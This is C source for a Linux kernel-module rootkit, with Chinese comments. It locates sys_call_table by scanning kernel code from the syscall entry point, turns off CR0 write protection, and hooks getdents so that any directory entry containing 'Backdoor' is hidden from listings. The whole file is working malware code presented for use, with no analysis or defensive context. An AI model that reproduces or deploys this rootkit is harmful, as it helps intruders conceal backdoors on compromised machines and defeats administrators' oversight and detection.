#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <asm/ptrace.h>

char psname[10] = "Backdoor";
char *processname = psname;

typedef unsigned long (*sys_call_ptr_t)(void);
sys_call_ptr_t *_sys_call_table = NULL;

struct linux_dirent{
	unsigned long     d_ino;
	unsigned long     d_off;
	unsigned short    d_reclen;
	char    d_name[1];
};

// memory protection shinanigans
unsigned int level;
pte_t *pte;

typedef asmlinkage long (*old_getdents_t)(const struct pt_regs *regs);
old_getdents_t old_getdents = NULL;

// hooked mkdir function
asmlinkage long hooked_getdents(const struct pt_regs *regs) {
    unsigned int fd = regs->di;
    char *dirp = (char*) regs->si;
    unsigned long count = 1;
    
    struct linux_dirent *td,*td1,*td2,*td3;  
    int number;
    int copy_len = 0;

    number = (*old_getdents) (regs);  
    if (!number)  
        return (number); 
    // 分配内核空间，并把用户空间的数据拷贝到内核空间  
    td2 = (struct linux_dirent *) kmalloc(number, GFP_KERNEL);
    td1 = (struct linux_dirent *) kmalloc(number, GFP_KERNEL);
    td = td1;
    td3 = td2;
    copy_from_user(td2, dirp, number); 
    while(number>0){

        
        number = number - td2->d_reclen;
        //printk("%s\n",td2->d_name);
        if(strstr(td2->d_name,"Backdoor") == NULL){
            memmove(td1, (char *) td2 , td2->d_reclen);
            td1 = (struct linux_dirent *) ((char *)td1 + td2->d_reclen);
            copy_len = copy_len + td2->d_reclen;
        }

        td2 = (struct linux_dirent *) ((char *)td2 + td2->d_reclen);

    }
    // 将过滤后的数据拷贝回用户空间
    copy_to_user(dirp, td, copy_len);  
    kfree(td); 
    kfree(td3);
    return (copy_len);  

}

static void*
get_lstar_dosys_addr(void){
    unsigned long lstar;

    // temp variables for scan
    unsigned int i;
    unsigned char *off;
    rdmsrl(MSR_LSTAR, lstar);

    // print out int 0x80 handler
    printk("[+] entry_SYSCALL_64 is at 0x%lx\n", lstar);

    
    for(i = 0; i <= PAGE_SIZE; i++) {
        off = (char*)lstar + i;
        if(*(off) == 0x48 && *(off+1) == 0x89 && *(off+2) == 0xe6) {
            return (off + 3);                     //call do_syscall_64
        }
    }
  return NULL;
}

static void*
get_lstar_dosys(void)
{
  unsigned long* lstar_dosys_addr = get_lstar_dosys_addr();
  if(lstar_dosys_addr != NULL) {
      printk("[+] call_do_syscall_64 at: 0x%lx\n", lstar_dosys_addr);
      unsigned int offset = *(unsigned int*)((char*)lstar_dosys_addr + 1);
      printk("[+] offset is: 0x%08x\n", offset);
      unsigned long base = 0xffffffff00000000;

      return (void*)(base | ((unsigned long)lstar_dosys_addr + 5 + offset));
  }
  return NULL;
}
static void*
get_sys_sct_addr(unsigned long* do_syscall_64_addr)
{
  unsigned char* off;
  int i;
  for(i = 0; i <= PAGE_SIZE; i++) {
      off = (char*)do_syscall_64_addr + i;
      if(*(off) == 0x48 && *(off+1) == 0x8b && *(off+2) == 0x04 && *(off+3) == 0xfd) {
          return (off+4);
      }
  }
  return NULL;
}
static void*
get_sys_sct(unsigned long* do_syscall_64_addr) 
{
  unsigned long* sct_addr = get_sys_sct_addr(do_syscall_64_addr);
  if(!sct_addr){
      return NULL;
  }
  unsigned int offset = *(unsigned int*)(sct_addr);
  unsigned long base = 0xffffffff00000000;

  return (void*)(base | offset);
}

inline void mywrite_cr0(unsigned long cr0) {
    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

// 关闭写保护
void disable_write_protection(void)
{
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    mywrite_cr0(cr0);
}

// 打开写保护
void enable_write_protection(void)
{
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    mywrite_cr0(cr0);
}


static int rooty_init(void)
{   
    printk("[+] Finding sys_call_table\n");
    unsigned long* do_syscall_64_addr = 0;
    do_syscall_64_addr = get_lstar_dosys();
    if(!do_syscall_64_addr){
        printk("[x] Failed to find do_syscall_64_addr\n");
        return 0;
    }
    printk("[+] Found do_syscall_64_addr at: 0x%lx\n", do_syscall_64_addr);
    
    _sys_call_table = get_sys_sct(do_syscall_64_addr);
    if(!_sys_call_table) {
        printk("[x] Failed to find sys_call_table\n");
        return 0;
    }
    printk("[+] Found sys_call_table at: 0x%lx\n", _sys_call_table);
    old_getdents = (old_getdents_t) _sys_call_table[__NR_getdents];
    printk("offset: 0x%x\n\n\n\n",old_getdents);
    disable_write_protection();
	_sys_call_table[__NR_getdents] = (sys_call_ptr_t) hooked_getdents;
	enable_write_protection();
    printk(KERN_INFO "hideps2: module loaded.\n");//就是消息记录等级
	return 0;
}


static void rooty_exit(void)
{
    disable_write_protection();
    _sys_call_table[__NR_getdents] = (sys_call_ptr_t) old_getdents;
    enable_write_protection();
    printk(KERN_INFO "hideps: module removed\n");
}


MODULE_LICENSE("GPL");
module_init(rooty_init);
module_exit(rooty_exit);
